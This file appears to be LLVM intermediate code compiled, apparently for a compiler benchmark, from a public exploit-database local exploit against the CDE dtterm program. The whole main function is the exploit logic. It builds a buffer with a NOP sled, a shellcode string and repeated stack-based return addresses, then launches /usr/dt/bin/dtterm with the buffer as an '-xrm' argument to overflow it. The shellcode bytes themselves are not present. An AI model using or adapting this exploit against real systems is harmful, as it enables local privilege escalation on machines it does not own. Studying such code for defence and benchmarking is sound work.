; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19201.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19201.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFFER_SIZE = common dso_local global i32 0, align 4
@RET_LENGTH = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [20 x i8] c"Usage: %s [offset]\0A\00", align 1
@NOP = common dso_local global i8 0, align 1
@shell = common dso_local global i8* null, align 8
@ADJUST = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [13 x i8] c"ret = 0x%x,\0A\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"offset = %d\0A\00", align 1
@.str.3 = private unnamed_addr constant [18 x i8] c"buffer size = %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"/usr/dt/bin/dtterm\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"dtterm\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"-xrm\00", align 1
@.str.7 = private unnamed_addr constant [13 x i8] c"exec failed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @BUFFER_SIZE, align 4
  %13 = load i32, i32* @RET_LENGTH, align 4
  %14 = mul nsw i32 %13, 4
  %15 = add nsw i32 %12, %14
  %16 = add nsw i32 %15, 1
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %6, align 8
  %19 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %7, align 8
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 2
  br i1 %21, label %22, label %29

22:                                               ; preds = %2
  %23 = load i32, i32* @stderr, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @fprintf(i32 %23, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0), i8* %26)
  %28 = call i32 @exit(i32 1) #4
  unreachable

29:                                               ; preds = %2
  %30 = load i32, i32* %4, align 4
  %31 = icmp eq i32 %30, 2
  br i1 %31, label %32, label %37

32:                                               ; preds = %29
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i64 @atol(i8* %35)
  store i64 %36, i64* %8, align 8
  br label %38

37:                                               ; preds = %29
  store i64 0, i64* %8, align 8
  br label %38

38:                                               ; preds = %37, %32
  %39 = call i32 (...) @get_sp()
  %40 = add nsw i32 %39, 900
  %41 = sext i32 %40 to i64
  %42 = load i64, i64* %8, align 8
  %43 = add nsw i64 %41, %42
  store i64 %43, i64* %9, align 8
  store i32 0, i32* %10, align 4
  br label %44

44:                                               ; preds = %53, %38
  %45 = load i32, i32* %10, align 4
  %46 = load i32, i32* @BUFFER_SIZE, align 4
  %47 = icmp slt i32 %45, %46
  br i1 %47, label %48, label %56

48:                                               ; preds = %44
  %49 = load i8, i8* @NOP, align 1
  %50 = load i32, i32* %10, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i8, i8* %19, i64 %51
  store i8 %49, i8* %52, align 1
  br label %53

53:                                               ; preds = %48
  %54 = load i32, i32* %10, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %10, align 4
  br label %44

56:                                               ; preds = %44
  %57 = load i32, i32* @BUFFER_SIZE, align 4
  %58 = load i8*, i8** @shell, align 8
  %59 = call i32 @strlen(i8* %58)
  %60 = sub nsw i32 %57, %59
  %61 = load i32, i32* @ADJUST, align 4
  %62 = sub nsw i32 %60, %61
  store i32 %62, i32* %10, align 4
  store i32 0, i32* %11, align 4
  br label %63

63:                                               ; preds = %78, %56
  %64 = load i32, i32* %11, align 4
  %65 = load i8*, i8** @shell, align 8
  %66 = call i32 @strlen(i8* %65)
  %67 = icmp slt i32 %64, %66
  br i1 %67, label %68, label %81

68:                                               ; preds = %63
  %69 = load i8*, i8** @shell, align 8
  %70 = load i32, i32* %11, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %69, i64 %71
  %73 = load i8, i8* %72, align 1
  %74 = load i32, i32* %10, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %10, align 4
  %76 = sext i32 %74 to i64
  %77 = getelementptr inbounds i8, i8* %19, i64 %76
  store i8 %73, i8* %77, align 1
  br label %78

78:                                               ; preds = %68
  %79 = load i32, i32* %11, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %11, align 4
  br label %63

81:                                               ; preds = %63
  store i32 0, i32* %11, align 4
  br label %82

82:                                               ; preds = %93, %81
  %83 = load i32, i32* %11, align 4
  %84 = load i32, i32* @RET_LENGTH, align 4
  %85 = icmp slt i32 %83, %84
  br i1 %85, label %86, label %98

86:                                               ; preds = %82
  %87 = load i64, i64* %9, align 8
  %88 = trunc i64 %87 to i32
  %89 = load i32, i32* %10, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %19, i64 %90
  %92 = bitcast i8* %91 to i32*
  store i32 %88, i32* %92, align 1
  br label %93

93:                                               ; preds = %86
  %94 = load i32, i32* %11, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %11, align 4
  %96 = load i32, i32* %10, align 4
  %97 = add nsw i32 %96, 4
  store i32 %97, i32* %10, align 4
  br label %82

98:                                               ; preds = %82
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8, i8* %19, i64 %100
  store i8 0, i8* %101, align 1
  %102 = load i64, i64* %9, align 8
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0), i64 %102)
  %104 = load i64, i64* %8, align 8
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0), i64 %104)
  %106 = call i32 @strlen(i8* %19)
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.3, i64 0, i64 0), i32 %106)
  %108 = call i32 @execl(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* %19, i32* null)
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.7, i64 0, i64 0))
  %110 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %110)
  %111 = load i32, i32* %3, align 4
  ret i32 %111
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @atol(i8*) #2

declare dso_local i32 @get_sp(...) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
